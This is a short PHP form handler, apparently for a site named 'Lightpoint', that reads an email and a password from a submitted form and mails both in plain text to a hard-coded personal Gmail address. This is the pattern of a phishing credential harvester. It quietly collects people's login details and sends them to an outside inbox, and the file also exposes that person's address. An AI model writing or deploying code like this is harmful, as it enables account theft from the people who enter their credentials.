<?php 
$method = $_SERVER['REQUEST_METHOD'];

$recepient = "olyabelka1993@gmail.com";
$sitename = "Lightpoint";

$email = $_POST['email'];
$password = $_POST['password'];

$message = "Email: $email \n Пароль: $password";

$pagetitle = "Заявка с сайта \"$sitename\"";
mail($recepient, $pagetitle, $message); 

?>
